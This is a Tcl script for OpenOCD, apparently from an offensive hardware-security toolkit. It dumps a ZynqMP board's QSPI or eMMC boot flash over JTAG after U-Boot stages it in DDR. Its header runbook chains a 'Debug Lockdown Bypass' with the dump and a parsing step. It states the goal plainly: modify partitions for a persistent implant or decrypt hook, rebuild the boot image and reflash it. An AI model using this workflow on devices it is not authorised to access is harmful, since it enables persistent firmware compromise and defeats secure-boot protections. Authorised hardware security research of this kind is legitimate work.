# dump-boot-flash.tcl — grab the target's NON-VOLATILE boot image (QSPI / SD / eMMC): the
# reflashable artifact (FSBL + PMUFW + ATF + the OS partitions) you modify for a PERSISTENT implant.
#
# Why staging: on ZynqMP the boot flash is NOT memory-mapped — it lives behind the GQSPI / SD-MMC
# controller. The robust, board-agnostic route is to STAGE it into DDR with U-Boot (which knows the
# flash controller), then JTAG-dump that DDR window. Every link here is already proven on silicon
# (DDR-over-JTAG, U-Boot-over-JTAG, U-Boot `sf`/`mmc`, the chunked AXI-AP dump).
#
# ================= ENGAGEMENT RUNBOOK =================
# 1. (if debug was locked)   source openocd/reopen-debug.tcl          ;# Debug Lockdown Bypass
# 2. bring up DDR + run U-Boot over pure JTAG (no SD / no secure-boot needed):
#       openocd -f openocd/zcu102.cfg -c "init; source openocd/jtag-load-uboot.tcl; <run U-Boot>"
#    (jtag-load-uboot sources jtag-ddr-boot = init + A53 release + psu_init replay + verify_ddr)
# 3. on the U-Boot console (PS UART0, ttyUSB0 @115200) stage the boot flash into DDR:
#       QSPI : sf probe 0 0 0 ; sf read 0x10000000 0 0x01000000     ;# 16 MB QSPI -> DDR 0x10000000
#       eMMC : mmc dev 0 ; mmc read 0x10000000 0 0x8000             ;# 16 MB (0x8000 * 512B blks)
#       SD   : boot files are a FAT partition — easier to pull over UART (see project_sd_extract)
# 4. THIS script (separate OpenOCD invocation, A53 left as-is) JTAG-dumps the staged DDR window
#    to a file and prints the parse command:
#       FLASH_STAGE=0x10000000 FLASH_SIZE=0x01000000 FLASH_LABEL=qspi \
#         openocd -f openocd/zcu102.cfg -c "init; source openocd/dump-boot-flash.tcl; shutdown"
# =====================================================
#
# Output: dumps/boot-flash-<label>.bin (+ .json). Then:  python3 tools/parse-bootimage.py <file>
# -> identifies FSBL / PMUFW / ATF / OS partitions + per-partition encrypt/auth posture, ready to
#    modify (implant / banner / decrypt-hook) -> mkbootimage rebuild -> reflash via U-Boot `sf write`.
#
# Parameters via environment:
#   FLASH_STAGE  DDR address where U-Boot staged the flash   (default 0x10000000)
#   FLASH_SIZE   bytes to dump from there                    (default 0x01000000 = 16 MB)
#   FLASH_CHUNK  words per read_memory                       (default 4096 = 16 KB max; keep <=4096)
#   FLASH_LABEL  short name                                  (default qspi)
#   FLASH_OUT    output path                                 (default dumps/boot-flash-<label>.bin)

set _d [file dirname [info script]]
if {[info commands say] eq ""} { proc say {l} { echo $l } }
source [file join $_d lib dump-memory.tcl]

proc _envd {name def} { if {[info exists ::env($name)]} { return $::env($name) } ; return $def }
set STAGE [_envd FLASH_STAGE 0x10000000]
set SIZE  [_envd FLASH_SIZE  0x01000000]
set CHUNK [_envd FLASH_CHUNK 4096]
set LABEL [_envd FLASH_LABEL qspi]
set OUT   [_envd FLASH_OUT   ""]
if {$OUT eq ""} { set OUT [file join $_d .. dumps "boot-flash-${LABEL}.bin"] }
# Target/DAP names are auto-detected (+ boards/<soc>.env) by board-profile.tcl — not board-hardcoded.
source [file join $_d board-profile.tcl]

catch { targets $AXI_TARGET } _
catch { $AXI_TARGET arp_examine } _
for {set i 0} {$i < 3} {incr i} { catch { $DAP_NAME dpreg 0 0x1e } _ ; after 5 }

say ""
say "================================================================"
say " DUMP BOOT FLASH (staged in DDR via U-Boot)"
say "================================================================"
say [format " stage addr   %08X   (where U-Boot put the flash)" $STAGE]
say [format " size         %X bytes" $SIZE]
say " out          $OUT"

# Sanity: the staging window should NOT look empty/erased. A staged boot image starts with the
# ZynqMP boot header; an all-0x00/0xFF/0xDEADBEEF first word means U-Boot didn't read flash here.
set w0 "ERR"
if {![catch {read_memory $STAGE 32 1} _w]} { set w0 [lindex $_w 0] }
if {$w0 eq "ERR"} {
    say ""
    say " WARN: staging window unreadable — is the AXI-AP up / DDR initialised? (run jtag-ddr-boot)"
} elseif {$w0 == 0x00000000 || $w0 == 0xFFFFFFFF || $w0 == 0xDEADBEEF} {
    say ""
    say [format " WARN: first word at stage = 0x%08X (empty/erased) — did U-Boot 'sf read' run?" $w0]
    say "       This dump will just be blank DDR. Stage the flash first (runbook step 3)."
} else {
    say [format " first word   0x%08X   (looks like real flash content)" $w0]
}

set res [dump_memory $STAGE $SIZE $CHUNK $OUT $LABEL]

set meta [dict create \
  staged_at     [format 0x%08X $STAGE] \
  size_bytes    $SIZE \
  chunk_words   $CHUNK \
  label         $LABEL \
  first_word    [expr {$w0 eq "ERR" ? "ERR" : [format 0x%08X $w0]}] \
  bytes_written [dict get $res bytes_written] \
  chunks_ok     [dict get $res chunks_ok] \
  chunks_failed [dict get $res chunks_failed]]
write_dump_metadata "${OUT}.json" $meta {}

say ""
say "metadata -> ${OUT}.json"
say ""
say "NEXT — parse the boot image (identifies FSBL/PMUFW/ATF/OS + encrypt/auth per partition):"
say "    python3 tools/parse-bootimage.py $OUT"
say "then modify a partition, rebuild with mkbootimage, and reflash over JTAG (U-Boot 'sf write')."
say ""
